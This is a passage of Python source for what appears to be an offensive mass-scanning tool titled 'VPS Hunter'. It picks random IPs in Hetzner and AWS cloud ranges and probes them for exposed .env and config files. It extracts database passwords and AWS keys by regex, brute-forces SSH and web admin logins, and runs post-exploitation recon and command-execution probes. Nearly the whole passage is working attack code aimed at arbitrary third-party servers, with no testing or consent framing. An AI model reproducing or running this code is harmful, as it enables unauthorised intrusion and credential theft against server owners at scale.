        conn = aiohttp.TCPConnector(
            limit=15 if IS_TERMUX else 30,
            limit_per_host=5 if IS_TERMUX else 10,
            ttl_dns_cache=600,
            use_dns_cache=True,
            enable_cleanup_closed=True,
            force_close=False,
        )
        timeout = aiohttp.ClientTimeout(
            total=self.connect_timeout + self.read_timeout,
            connect=self.connect_timeout,
            sock_read=self.read_timeout
        )
        self.session = aiohttp.ClientSession(
            connector=conn,
            timeout=timeout,
            headers={"User-Agent": random.choice(self._user_agents)}
        )

    async def close(self):
        if self.session:
            await self.session.close()

    def banner_text(self):
        print(f"""{M}
    ██╗   ██╗██████╗ ███████╗    ██╗  ██╗██╗   ██╗███╗   ██╗████████╗███████╗██████╗
    ██║   ██║██╔══██╗██╔════╝    ██║  ██║██║   ██║████╗  ██║╚══██╔══╝██╔════╝██╔══██╗
    ██║   ██║██████╔╝███████╗    ███████║██║   ██║██╔██╗ ██║   ██║   █████╗  ██████╔╝
    ╚██╗ ██╔╝██╔═══╝ ╚════██║    ██╔══██║██║   ██║██║╚██╗██║   ██║   ██╔══╝  ██╔══██╗
     ╚████╔╝ ██║     ███████║    ██║  ██║╚██████╔╝██║ ╚████║   ██║   ███████╗██║  ██║
      ╚═══╝  ╚═╝     ╚══════╝    ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
    {C}v6.0 - Termux Optimized | Pure Python Async | No Root | SQLite Persistence{W}
    {BOLD}{G}Built for LO. The pocket-sized predator.{W}
    {Y}{"[Termux Detected - Mobile Optimizations Active]" if IS_TERMUX else "[Desktop Mode]"}{W}
        """)

    def log(self, msg: str, color: str = W):
        timestamp = datetime.now().strftime("%H:%M:%S")
        print(f"{C}[{timestamp}]{W} {color}{msg}{W}")

    def random_ip_from_network(self, network: ipaddress.IPv4Network) -> str:
        network_int = int(network.network_address)
        broadcast_int = int(network.broadcast_address)
        host_int = random.randint(network_int + 1, broadcast_int - 1)
        return str(ipaddress.IPv4Address(host_int))

    def weighted_random_choice(self, weighted_ranges: List[Tuple]) -> ipaddress.IPv4Network:
        total_weight = sum(weight for _, weight in weighted_ranges)
        r = random.uniform(0, total_weight)
        cumulative = 0
        for network, weight in weighted_ranges:
            cumulative += weight
            if r <= cumulative:
                return network
        return weighted_ranges[-1][0]


    async def generate_targets_stream(self, provider: str, region: str, count: int) -> AsyncGenerator[Target, None]:
        weighted_ranges = []
        if provider == "hetzner":
            weighted_ranges = self.cloud_ranges["hetzner"].get(region, [])
        elif provider == "aws":
            aws_regions = self.cloud_ranges["aws"].get(region, {})
            if isinstance(aws_regions, dict):
                for subregion, networks in aws_regions.items():
                    weighted_ranges.extend(networks)
            else:
                weighted_ranges = aws_regions

        if not weighted_ranges:
            self.log(f"No ranges found for {provider}/{region}", R)
            return

        total_hosts = sum(w for _, w in weighted_ranges)
        self.log(f"Streaming from {len(weighted_ranges)} ranges (~{total_hosts:,} total hosts)", B)
        self.log(f"Bloom filter: {self.seen_ips.memory_usage_mb():.2f}MB | ~1% FP rate", B)

        generated = 0
        attempts = 0
        max_attempts = count * 15

        while generated < count and attempts < max_attempts:
            attempts += 1
            network = self.weighted_random_choice(weighted_ranges)
            ip = self.random_ip_from_network(network)

            if ip in self.seen_ips:
                continue
            if self.store.is_scanned(ip, 22) or self.store.is_scanned(ip, 80) or self.store.is_scanned(ip, 443):
                continue

            self.seen_ips.add(ip)
            port = random.choice(self.common_ports)

            yield Target(ip=ip, port=port, provider=provider, region=region)
            generated += 1

            if generated % 50 == 0:
                self.log(f"Generated {generated}/{count} unique targets...", B)

        self.log(f"Generated {generated} unique targets", G)

    def os_fingerprint_banner(self, banner: str) -> Tuple[Optional[str], float]:
        if not banner:
            return None, 0.0
        banner_lower = banner.lower()
        guesses = []

        os_map = {
            "ubuntu": ("Linux (Ubuntu)", 0.95),
            "debian": ("Linux (Debian)", 0.95),
            "centos": ("Linux (CentOS)", 0.95),
            "red hat": ("Linux (RHEL)", 0.95),
            "rhel": ("Linux (RHEL)", 0.95),
            "fedora": ("Linux (Fedora)", 0.9),
            "alpine": ("Linux (Alpine)", 0.95),
            "openssh": ("Linux/Unix", 0.75),
            "iis": ("Windows", 0.95),
            "microsoft": ("Windows", 0.95),
            "nginx": ("Linux/Unix", 0.65),
            "apache": ("Linux/Unix", 0.65),
            "win32": ("Windows", 0.98),
            "windows": ("Windows", 0.98),
        }

        for keyword, (os_name, conf) in os_map.items():
            if keyword in banner_lower:
                guesses.append((os_name, conf))

        if guesses:
            return max(guesses, key=lambda x: x[1])
        return None, 0.0

    async def tcp_connect_with_retry(self, ip: str, port: int) -> Tuple[bool, float, Optional[str]]:
        for attempt in range(self.max_retries):
            start = time.time()
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port),
                    timeout=self.connect_timeout
                )
                writer.close()
                await writer.wait_closed()
                elapsed = (time.time() - start) * 1000
                return True, elapsed, None
            except asyncio.TimeoutError:
                if attempt < self.max_retries - 1:
                    await asyncio.sleep(self.retry_delay * (attempt + 1))
                continue
            except OSError as e:
                if e.errno == 24:
                    await asyncio.sleep(2)
                    if attempt < self.max_retries - 1:
                        continue
                return False, 0, str(e)
            except Exception as e:
                if attempt < self.max_retries - 1:
                    await asyncio.sleep(self.retry_delay)
                continue
        return False, 0, "Max retries exceeded"

    async def grab_banner_with_retry(self, ip: str, port: int) -> Optional[str]:
        for attempt in range(self.max_retries):
            try:
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(ip, port),
                    timeout=self.connect_timeout
                )

                probe = b""
                if port == 80:
                    probe = b"GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\n\r\n" % ip.encode()
                elif port == 443:
                    writer.close()
                    await writer.wait_closed()
                    return await self.grab_https_banner(ip, port)
                elif port == 22:
                    probe = b"SSH-2.0-OpenSSH_8.9\r\n"
                elif port == 3306:
                    probe = b"\x00"
                elif port == 5432:
                    probe = b"\x00\x00\x00\x08\x04\xd2\x16\x2f"
                else:
                    probe = b"\r\n"

                writer.write(probe)
                await writer.drain()

                data = await asyncio.wait_for(reader.read(1024), timeout=self.read_timeout)
                writer.close()
                await writer.wait_closed()

                banner = data.decode("utf-8", errors="ignore").strip()[:400]
                return banner if banner else None

            except asyncio.TimeoutError:
                if attempt < self.max_retries - 1:
                    await asyncio.sleep(self.retry_delay * (attempt + 1))
                continue
            except Exception:
                if attempt < self.max_retries - 1:
                    await asyncio.sleep(self.retry_delay)
                continue
        return None

    async def grab_https_banner(self, ip: str, port: int) -> Optional[str]:
        if not AIOHTTP_AVAILABLE or not self.session:
            return None

        protocol = "https"
        url = f"{protocol}://{ip}:{port}/" if port != 443 else f"{protocol}://{ip}/"
        banner_parts = []

        try:
            async with self.session.get(url, allow_redirects=False, ssl=True) as resp:
                banner_parts.append(f"HTTP/{resp.version.major}.{resp.version.minor} {resp.status}")
                server = resp.headers.get("Server", "")
                if server:
                    banner_parts.append(f"Server: {server[:100]}")
                banner_parts.append("TLS: valid")
                return " | ".join(banner_parts)
        except aiohttp.ClientConnectorCertificateError:
            banner_parts.append("TLS: invalid-cert")
        except aiohttp.ClientConnectorSSLError:
            banner_parts.append("TLS: ssl-error")
        except Exception:
            pass

        try:
            async with self.session.get(url, allow_redirects=False, ssl=False) as resp:
                banner_parts.insert(0, f"HTTP/{resp.version.major}.{resp.version.minor} {resp.status}")
                server = resp.headers.get("Server", "")
                if server:
                    banner_parts.insert(1, f"Server: {server[:100]}")
                return " | ".join(banner_parts)
        except Exception:
            return None


    async def check_http_vuln(self, ip: str, port: int, tls_state: Optional[str] = None) -> List[Dict]:
        if not AIOHTTP_AVAILABLE or not self.session:
            return []

        vulns = []
        is_https = port in [443, 8443]
        protocol = "https" if is_https else "http"
        base = f"{protocol}://{ip}:{port}" if port not in [80, 443] else f"{protocol}://{ip}"
        ssl_ctx = False
        if is_https and tls_state == "valid":
            ssl_ctx = True

        checks = [
            (".env", ["DB_PASSWORD", "AWS_SECRET", "API_KEY", "DATABASE_URL", "SECRET_KEY"],
             "exposed_env", "critical"),
            (".git/HEAD", ["ref:"], "git_exposed", "high"),
            ("wp-config.php", [], "config_exposed", "critical"),
            ("config.php", [], "config_exposed", "critical"),
            (".env.local", [], "config_exposed", "critical"),
            (".env.production", [], "config_exposed", "critical"),
            ("config.json", [], "config_exposed", "critical"),
            ("settings.json", [], "config_exposed", "critical"),
            ("application.yml", [], "config_exposed", "critical"),
            ("database.yml", [], "config_exposed", "critical"),
            ("secrets.yml", [], "config_exposed", "critical"),
            ("phpinfo.php", ["phpinfo()"], "phpinfo_exposed", "high"),
            ("info.php", ["phpinfo()"], "phpinfo_exposed", "high"),
        ]

        for path, indicators, vtype, severity in checks:
            try:
                async with self.session.get(f"{base}/{path}", allow_redirects=False, ssl=ssl_ctx,
                                           timeout=aiohttp.ClientTimeout(total=6)) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        if not indicators or any(kw in text for kw in indicators):
                            vulns.append({
                                "type": vtype,
                                "url": f"{base}/{path}",
                                "severity": severity,
                                "evidence": text[:150] if indicators else None,
                                "tls": tls_state
                            })
            except Exception:
                continue

        admin_paths = ["/admin", "/wp-admin", "/phpmyadmin", "/manager", "/console",
                      "/administrator", "/login", "/signin", "/api/admin",
                      "/jenkins", "/gitlab", "/grafana", "/kibana", "/nexus",
                      "/sonarqube", "/jira", "/confluence", "/redmine"]
        for path in admin_paths:
            try:
                async with self.session.get(f"{base}{path}", allow_redirects=False, ssl=ssl_ctx,
                                           timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status in [200, 401]:
                        vulns.append({
                            "type": "admin_panel",
                            "url": f"{base}{path}",
                            "severity": "medium",
                            "status": resp.status,
                            "tls": tls_state
                        })
                        break
            except Exception:
                continue

        backup_paths = ["/backup.zip", "/backup.tar.gz", "/backup.sql", "/dump.sql",
                       "/database.sql", "/db.sql", "/backup/", "/backups/"]
        for path in backup_paths:
            try:
                async with self.session.get(f"{base}{path}", allow_redirects=False, ssl=ssl_ctx,
                                           timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    if resp.status == 200:
                        vulns.append({
                            "type": "backup_exposed",
                            "url": f"{base}{path}",
                            "severity": "high",
                            "tls": tls_state
                        })
                        break
            except Exception:
                continue

        return vulns

    async def harvest_config(self, ip: str, port: int, vuln: Dict) -> Optional[Dict]:
        if not AIOHTTP_AVAILABLE or not self.session:
            return None

        url = vuln["url"]
        try:
            async with self.session.get(url, allow_redirects=False, ssl=False,
                                       timeout=aiohttp.ClientTimeout(total=8)) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    harvested = {"url": url, "size": len(text), "credentials": []}

                    # Use re.compile to avoid raw string quote issues
                    import re as _re
                    patterns = [
                        (_re.compile(r"""DB_PASSWORD[=:]\s*['"]?([^'"\s]+)"""), "database_password"),
                        (_re.compile(r"""DATABASE_URL[=:]\s*['"]?([^'"\s]+)"""), "database_url"),
                        (_re.compile(r"""MYSQL_PASSWORD[=:]\s*['"]?([^'"\s]+)"""), "mysql_password"),
                        (_re.compile(r"""POSTGRES_PASSWORD[=:]\s*['"]?([^'"\s]+)"""), "postgres_password"),
                        (_re.compile(r"""password[=:]\s*['"]?([^'"\s]+)"""), "generic_password"),
                        (_re.compile(r"""PWD[=:]\s*['"]?([^'"\s]+)"""), "pwd"),
                        (_re.compile(r"""AWS_ACCESS_KEY_ID[=:]\s*['"]?([^'"\s]+)"""), "aws_key_id"),
                        (_re.compile(r"""AWS_SECRET_ACCESS_KEY[=:]\s*['"]?([^'"\s]+)"""), "aws_secret"),
                        (_re.compile(r"""AKIA[0-9A-Z]{16}"""), "aws_access_key"),
                        (_re.compile(r"""API_KEY[=:]\s*['"]?([^'"\s]{16,})"""), "api_key"),
                        (_re.compile(r"""SECRET_KEY[=:]\s*['"]?([^'"\s]{16,})"""), "secret_key"),
                        (_re.compile(r"""TOKEN[=:]\s*['"]?([^'"\s]{16,})"""), "token"),
                        (_re.compile(r"""define\(\s*'DB_PASSWORD'\s*,\s*'([^']+)'\s*\)"""), "wordpress_db_pass"),
                        (_re.compile(r"""define\(\s*'DB_USER'\s*,\s*'([^']+)'\s*\)"""), "wordpress_db_user"),
                        (_re.compile(r"""define\(\s*'DB_NAME'\s*,\s*'([^']+)'\s*\)"""), "wordpress_db_name"),
                    ]

                    for pattern, ctype in patterns:
                        matches = pattern.findall(text)
                        for match in matches:
                            val = match if isinstance(match, str) else match[0] if match else ""
                            if len(val) > 2:
                                harvested["credentials"].append({
                                    "type": ctype,
                                    "value": val[:100],
                                    "context": text[max(0, text.find(val)-20):text.find(val)+len(val)+20]
                                })

                    if harvested["credentials"]:
                        self.log(f"  {G}HARVESTED {len(harvested['credentials'])} credentials from config!{W}", G)
                        for cred in harvested["credentials"]:
                            if cred["type"] in ["database_password", "generic_password", "wordpress_db_pass"]:
                                self._harvested_passwords.add(cred["value"])
                        return harvested
        except Exception:
            pass
        return None


    async def ssh_bruteforce_asyncssh(self, ip: str, username: str, passwords: List[str]) -> Optional[str]:
        if not ASYNCSSH_AVAILABLE:
            return None

        async with self._ssh_semaphore:
            for pwd in passwords[:self.ssh_batch_size]:
                try:
                    async with asyncssh.connect(ip, username=username, password=pwd,
                                                known_hosts=None, client_keys=[],
                                                agent_path=None, login_timeout=10) as conn:
                        result = await conn.run("echo PWNED", timeout=5)
                        if "PWNED" in result.stdout:
                            return pwd
                except (asyncssh.PermissionDenied, asyncssh.AuthenticationFailed):
                    continue
                except Exception:
                    break
        return None

    async def ssh_bruteforce_paramiko(self, ip: str, username: str, passwords: List[str]) -> Optional[str]:
        if not PARAMIKO_AVAILABLE:
            return None

        loop = asyncio.get_event_loop()
        for pwd in passwords[:self.ssh_batch_size]:
            try:
                def _try_connect():
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(ip, username=username, password=pwd,
                                   timeout=8, banner_timeout=8, auth_timeout=8,
                                   allow_agent=False, look_for_keys=False,
                                   compress=True)
                    stdin, stdout, stderr = client.exec_command("echo PWNED", timeout=5)
                    output = stdout.read().decode("utf-8", errors="ignore")
                    client.close()
                    return "PWNED" in output

                success = await loop.run_in_executor(None, _try_connect)
                if success:
                    return pwd
            except Exception:
                continue
        return None

    async def ssh_bruteforce(self, ip: str, username: str, passwords: List[str]) -> Optional[str]:
        if ASYNCSSH_AVAILABLE:
            result = await self.ssh_bruteforce_asyncssh(ip, username, passwords)
            if result:
                return result
        if PARAMIKO_AVAILABLE:
            result = await self.ssh_bruteforce_paramiko(ip, username, passwords)
            if result:
                return result
        return None

    async def ssh_post_exploit(self, ip: str, username: str, password: str) -> Optional[Dict]:
        if ASYNCSSH_AVAILABLE:
            return await self._ssh_post_exploit_asyncssh(ip, username, password)
        elif PARAMIKO_AVAILABLE:
            return await self._ssh_post_exploit_paramiko(ip, username, password)
        return None

    async def _ssh_post_exploit_asyncssh(self, ip: str, username: str, password: str) -> Optional[Dict]:
        try:
            async with asyncssh.connect(ip, username=username, password=password,
                                        known_hosts=None, client_keys=[],
                                        agent_path=None, login_timeout=10) as conn:
                cmd = "whoami; id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -5; echo '---'; cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1; echo '---'; df -h 2>/dev/null | head -5; echo '---'; ip addr 2>/dev/null | grep 'inet ' | head -3; echo '---'; cat /etc/passwd 2>/dev/null | wc -l; echo '---'; sudo -l 2>/dev/null | head -10"
                result = await conn.run(cmd, timeout=15)
                output = result.stdout

                lines = output.split("\n")
                post_data = {
                    "whoami": lines[0] if lines else "unknown",
                    "id": lines[1] if len(lines) > 1 else "unknown",
                    "hostname": lines[2] if len(lines) > 2 else "unknown",
                    "kernel": lines[3] if len(lines) > 3 else "unknown",
                    "os_info": "\n".join(lines[4:9]) if len(lines) > 9 else "",
                    "cpu": next((l for l in lines if "model name" in l), "unknown"),
                    "disk": "\n".join([l for l in lines if l and not l.startswith("---")][8:13]) if len(lines) > 13 else "",
                    "network": "\n".join([l for l in lines if "inet " in l][:3]),
                    "user_count": next((l for l in lines if l.isdigit()), "unknown"),
                    "sudo_access": "yes" if any("sudo" in l.lower() for l in lines) else "no",
                    "raw_output": output[:2000]
                }
                return post_data
        except Exception as e:
            return {"error": str(e)}

    async def _ssh_post_exploit_paramiko(self, ip: str, username: str, password: str) -> Optional[Dict]:
        try:
            loop = asyncio.get_event_loop()
            def _exec():
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip, username=username, password=password,
                               timeout=10, banner_timeout=10, auth_timeout=10,
                               allow_agent=False, look_for_keys=False)
                cmd = "whoami; id; hostname; uname -a; cat /etc/os-release 2>/dev/null | head -5; echo '---'; cat /proc/cpuinfo 2>/dev/null | grep 'model name' | head -1; echo '---'; df -h 2>/dev/null | head -5; echo '---'; ip addr 2>/dev/null | grep 'inet ' | head -3; echo '---'; cat /etc/passwd 2>/dev/null | wc -l; echo '---'; sudo -l 2>/dev/null | head -10"
                stdin, stdout, stderr = client.exec_command(cmd, timeout=15)
                output = stdout.read().decode("utf-8", errors="ignore")
                client.close()
                return output

            output = await loop.run_in_executor(None, _exec)
            lines = output.split("\n")
            post_data = {
                "whoami": lines[0] if lines else "unknown",
                "id": lines[1] if len(lines) > 1 else "unknown",
                "hostname": lines[2] if len(lines) > 2 else "unknown",
                "kernel": lines[3] if len(lines) > 3 else "unknown",
                "os_info": "\n".join(lines[4:9]) if len(lines) > 9 else "",
                "cpu": next((l for l in lines if "model name" in l), "unknown"),
                "disk": "\n".join([l for l in lines if l and not l.startswith("---")][8:13]) if len(lines) > 13 else "",
                "network": "\n".join([l for l in lines if "inet " in l][:3]),
                "user_count": next((l for l in lines if l.isdigit()), "unknown"),
                "sudo_access": "yes" if any("sudo" in l.lower() for l in lines) else "no",
                "raw_output": output[:2000]
            }
            return post_data
        except Exception as e:
            return {"error": str(e)}


    async def web_bruteforce_aggressive(self, ip: str, port: int, path: str,
                                         username: str = "admin") -> Optional[Dict]:
        if not AIOHTTP_AVAILABLE or not self.session:
            return None

        protocol = "https" if port in [443, 8443] else "http"
        base = f"{protocol}://{ip}:{port}" if port not in [80, 443] else f"{protocol}://{ip}"
        url = f"{base}{path}"

        passwords = self.wordlist_gen.generate_for_web(banner=None, path=path, ip=ip)
        for hp in self._harvested_passwords:
            if hp not in passwords:
                passwords.insert(0, hp)

        usernames = [username, "admin", "administrator", "root", "user", "test",
                    "guest", "demo", "manager", "operator", "service", "webmaster",
                    "postmaster", "hostmaster", "info", "support", "sales",
                    "ubuntu", "debian", "centos", "fedora", "oracle", "mysql",
                    "postgres", "nginx", "apache", "wordpress", "wp", "jenkins",
                    "gitlab", "grafana", "elastic", "kibana", "nexus", "sonar"]

        # HTTP Basic Auth
        for user in usernames[:10]:
            for pwd in passwords[:50]:
                try:
                    async with self.session.get(url, auth=aiohttp.BasicAuth(user, pwd),
                                               ssl=False, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            success_indicators = ["logout", "dashboard", "welcome", "admin panel", "control panel",
                                                  "wp-admin", "jenkins", "gitlab", "grafana", "profile", "settings",
                                                  "overview", "summary", "status", "manage", "configuration"]
                            fail_indicators = ["login", "password", "invalid", "incorrect", "failed",
                                              "authentication", "sign in", "log in", "error"]
                            has_success = any(s in text.lower() for s in success_indicators)
                            has_failure = any(f in text.lower() for f in fail_indicators)
                            if has_success and not has_failure:
                                return {
                                    "user": user, "pass": pwd, "method": "basic_auth", "url": url,
                                    "indicator": "dashboard detected"
                                }
                except Exception:
                    continue
                await asyncio.sleep(0.05)

        # Form-based with CSRF
        import re as _re
        for user in usernames[:8]:
            for pwd in passwords[:40]:
                try:
                    async with self.session.get(url, ssl=False,
                                               timeout=aiohttp.ClientTimeout(total=8)) as login_resp:
                        login_text = await login_resp.text()

                        csrf_patterns = [
                            _re.compile(r"""name=["']?_csrf["']?\s+value=["']?([^"'\s]+)"""),
                            _re.compile(r"""name=["']?csrf_token["']?\s+value=["']?([^"'\s]+)"""),
                            _re.compile(r"""name=["']?authenticity_token["']?\s+value=["']?([^"'\s]+)"""),
                            _re.compile(r"""csrf["']?\s*:\s*["']?([^"'\s,}]+)"""),
                            _re.compile(r"""_token["']?\s*:\s*["']?([^"'\s,}]+)"""),
                            _re.compile(r"""name=["']?wpnonce["']?\s+value=["']?([^"'\s]+)"""),
                        ]

                        csrf_token = None
                        for pattern in csrf_patterns:
                            match = pattern.search(login_text)
                            if match:
                                csrf_token = match.group(1)
                                break

                        form_variants = [
                            {"username": user, "password": pwd, "login": "Login"},
                            {"user": user, "pass": pwd, "submit": "Login"},
                            {"log": user, "pwd": pwd, "wp-submit": "Log In"},
                            {"pma_username": user, "pma_password": pwd},
                            {"email": user, "password": pwd, "submit": "Sign In"},
                            {"j_username": user, "j_password": pwd, "submit": "Login"},
                            {"login": user, "password": pwd, "commit": "Sign in"},
                            {"name": user, "password": pwd, "action": "login"},
                            {"account": user, "password": pwd, "submit": "Login"},
                            {"id": user, "pw": pwd, "submit": "Login"},
                            {"user_login": user, "user_pass": pwd, "wp-submit": "Log In"},
                            {"admin_username": user, "admin_password": pwd, "login": "Login"},
                        ]

                        if csrf_token:
                            for variant in form_variants:
                                variant["_csrf"] = csrf_token
                                variant["csrf_token"] = csrf_token
                                variant["authenticity_token"] = csrf_token

                        for form_data in form_variants:
                            try:
                                async with self.session.post(url, data=form_data, ssl=False,
                                                            allow_redirects=True,
                                                            timeout=aiohttp.ClientTimeout(total=10)) as resp:
                                    text = await resp.text()
                                    success_indicators = ["logout", "dashboard", "welcome", "admin panel",
                                                          "control panel", "overview", "profile", "settings",
                                                          "wp-admin", "jenkins", "gitlab", "grafana", "kibana",
                                                          "summary", "status", "manage", "configuration",
                                                          "successfully", "logged in", "authenticated"]
                                    failure_indicators = ["invalid", "incorrect", "failed", "error",
                                                          "authentication failed", "wrong password",
                                                          "login failed", "access denied", "unauthorized"]

                                    has_success = any(s in text.lower() for s in success_indicators)
                                    has_failure = any(f in text.lower() for f in failure_indicators)
                                    url_changed = str(resp.url) != url

                                    if (has_success and not has_failure) or (url_changed and has_success):
                                        return {
                                            "user": user, "pass": pwd, "method": "form_post",
                                            "url": str(resp.url), "form_fields": list(form_data.keys()),
                                            "csrf_used": csrf_token is not None
                                        }
                            except Exception:
                                continue
                except Exception:
                    continue
                await asyncio.sleep(0.05)

        # JSON API login
        for user in usernames[:5]:
            for pwd in passwords[:20]:
                json_payloads = [
                    {"username": user, "password": pwd},
                    {"email": user, "password": pwd},
                    {"login": user, "password": pwd},
                    {"user": user, "pass": pwd},
                    {"name": user, "password": pwd},
                    {"id": user, "pw": pwd},
                ]
                for payload in json_payloads:
                    try:
                        async with self.session.post(url, json=payload, ssl=False,
                                                    timeout=aiohttp.ClientTimeout(total=8)) as resp:
                            text = await resp.text()
                            if resp.status in [200, 201] and any(s in text.lower() for s in
                                                                  ["token", "success", "authenticated", "session"]):
                                return {
                                    "user": user, "pass": pwd, "method": "json_api",
                                    "url": url, "response_preview": text[:200]
                                }
                    except Exception:
                        continue
                await asyncio.sleep(0.05)

        return None

    async def web_post_exploit(self, ip: str, port: int, cracked: Dict) -> Optional[Dict]:
        if not AIOHTTP_AVAILABLE or not self.session:
            return None

        protocol = "https" if port in [443, 8443] else "http"
        base = f"{protocol}://{ip}:{port}" if port not in [80, 443] else f"{protocol}://{ip}"
        url = cracked["url"]

        post_data = {
            "login_url": url,
            "credentials": f"{cracked['user']}:{cracked['pass']}",
            "method": cracked["method"],
            "discovered_pages": [],
            "potential_escalation": []
        }

        admin_pages = [
            "/admin/users", "/admin/settings", "/api/users", "/api/admin",
            "/wp-admin/users.php", "/phpmyadmin/server_databases.php",
            "/jenkins/manage", "/gitlab/admin", "/grafana/admin",
            "/config", "/.env", "/api/config", "/settings",
            "/admin/api", "/api/v1/admin", "/manage/users",
            "/console", "/shell", "/terminal", "/exec",
            "/api/execute", "/api/run", "/api/command",
            "/admin/backup", "/backup", "/export", "/dump",
        ]

        auth = None
        if cracked["method"] == "basic_auth":
            auth = aiohttp.BasicAuth(cracked["user"], cracked["pass"])

        for page in admin_pages:
            try:
                if auth:
                    async with self.session.get(f"{base}{page}", auth=auth, ssl=False,
                                               timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            post_data["discovered_pages"].append({
                                "url": f"{base}{page}", "size": len(text), "preview": text[:100]
                            })
                else:
                    async with self.session.get(f"{base}{page}", ssl=False,
                                               timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            if len(text) > 100:
                                post_data["discovered_pages"].append({
                                    "url": f"{base}{page}", "size": len(text), "preview": text[:100]
                                })
            except Exception:
                continue

        exec_endpoints = [
            "/api/exec", "/api/execute", "/api/run", "/api/command",
            "/console", "/shell", "/terminal", "/admin/exec",
            "/debug", "/test", "/api/debug", "/dev/execute",
        ]

        for endpoint in exec_endpoints:
            try:
                test_payloads = [
                    {"cmd": "id"}, {"command": "id"}, {"exec": "id"},
                    {"cmd": "whoami"}, {"command": "whoami"}, {"run": "whoami"},
                    {"cmd": "uname -a"}, {"command": "uname -a"},
                ]
                for payload in test_payloads:
                    async with self.session.post(f"{base}{endpoint}", json=payload, ssl=False,
                                                timeout=aiohttp.ClientTimeout(total=5)) as resp:
                        text = await resp.text()
                        if any(indicator in text.lower() for indicator in
                               ["uid=", "gid=", "root", "www-data", "ubuntu", "debian"]):
                            post_data["potential_escalation"].append({
                                "endpoint": f"{base}{endpoint}",
                                "payload": payload, "response": text[:200]
                            })
                            break
            except Exception:
                continue

        if post_data["discovered_pages"] or post_data["potential_escalation"]:
            return post_data
        return None


    async def scan_target(self, target: Target) -> ScanResult:
        result = ScanResult(ip=target.ip, port=target.port)
        self.stats["scanned"] += 1

        if self.rate_limit > 0:
            await asyncio.sleep(self.rate_limit)

        alive, response_time, error = await self.tcp_connect_with_retry(target.ip, target.port)
        result.response_time_ms = response_time

        if not alive:
            result.error = error
            if error:
                self.stats["errors"] += 1
            self.store.save_result(result, self.session_id)
            self.store.mark_scanned(target.ip, target.port)
            return result

        result.alive = True
        self.stats["alive"] += 1
        self.log(f"Host {target.ip}:{target.port} ALIVE ({response_time:.0f}ms)", G)

        os_name, os_conf = self.os_fingerprint_banner(None)
        if os_name:
            result.os_guess = os_name
            result.os_confidence = os_conf

        banner = await self.grab_banner_with_retry(target.ip, target.port)
        if banner:
            result.banner = banner
            self.log(f"  Banner: {banner[:100]}...", B)

            if result.os_guess is None or result.os_confidence < 0.7:
                banner_os, banner_conf = self.os_fingerprint_banner(banner)
                if banner_os and banner_conf > (result.os_confidence or 0):
                    result.os_guess = banner_os
                    result.os_confidence = banner_conf
                    self.log(f"  OS: {banner_os} ({banner_conf*100:.0f}% confidence)", M)

        cves = self.check_cves(banner)
        if cves:
            result.cves = cves
            for cve in cves:
                color = R if cve["severity"] == "critical" else Y if cve["severity"] == "high" else B
                self.log(f"  {color}[CVE] {cve['id']}: {cve['desc']} ({cve['severity']}){W}")

        tls_state = None
        if target.port in [443, 8443]:
            if banner and "TLS: valid" in banner:
                tls_state = "valid"
                result.tls_valid = True
            elif banner and "TLS: invalid" in banner:
                tls_state = "invalid"
                result.tls_valid = False
            else:
                tls_state = "unknown"

        if target.port in [80, 8080, 443, 8443]:
            vulns = await self.check_http_vuln(target.ip, target.port, tls_state)
            result.vulns = vulns

            for v in vulns:
                color = R if v["severity"] == "critical" else Y if v["severity"] == "high" else B
                tls_info = f" [TLS:{v.get('tls', 'n/a')}]" if "tls" in v else ""
                self.log(f"  {color}[{v['severity'].upper()}] {v['type']}: {v['url']}{tls_info}{W}")

                if v["type"] in ["config_exposed", "exposed_env"]:
                    self.log(f"  Harvesting credentials from config...", C)
                    harvested = await self.harvest_config(target.ip, target.port, v)
                    if harvested:
                        result.config_harvested = harvested
                        self.stats["config_harvested"] += 1

                if v["type"] == "admin_panel":
                    self.log(f"  Aggressive web brute force on {v['url']}...", Y)
                    path = v["url"].replace(f"http://{target.ip}:{target.port}", "").replace(f"https://{target.ip}:{target.port}", "")
                    cracked = await self.web_bruteforce_aggressive(target.ip, target.port, path)
                    if cracked:
                        result.web_cracked = cracked
                        self.log(f"  {G}{BOLD}WEB CRACKED: {cracked['user']}:{cracked['pass']} @ {cracked['url']}{W}", G)
                        self.stats["web_cracked"] += 1
                        self.stats["cracked"] += 1

                        self.log(f"  Running web post-exploitation...", C)
                        post = await self.web_post_exploit(target.ip, target.port, cracked)
                        if post:
                            result.post_exploit = post
                            self.stats["post_exploit_success"] += 1
                            self.log(f"  {G}Post-exploit: {len(post['discovered_pages'])} pages, {len(post['potential_escalation'])} escalation vectors{W}", G)

        if target.port == 22:
            self.log(f"  Generating smart wordlist from banner...", C)
            ssh_passwords = self.wordlist_gen.generate_for_ssh(banner, result.os_guess, target.ip)
            for hp in self._harvested_passwords:
                if hp not in ssh_passwords:
                    ssh_passwords.insert(0, hp)

            self.log(f"  Wordlist: {len(ssh_passwords)} passwords | {len(self.ssh_users)} users", B)
            self.log(f"  Testing SSH credentials...", Y)

            tested = 0
            max_test = min(200, len(ssh_passwords))
            priority_users = ["root", "admin", "ubuntu", "debian", "centos", "ec2-user"]
            priority_passwords = ssh_passwords[:50]

            for user in priority_users:
                batch = priority_passwords[:self.ssh_batch_size]
                while batch:
                    cracked_pwd = await self.ssh_bruteforce(target.ip, user, batch)
                    if cracked_pwd:
                        result.ssh_cracked = {"user": user, "pass": cracked_pwd}
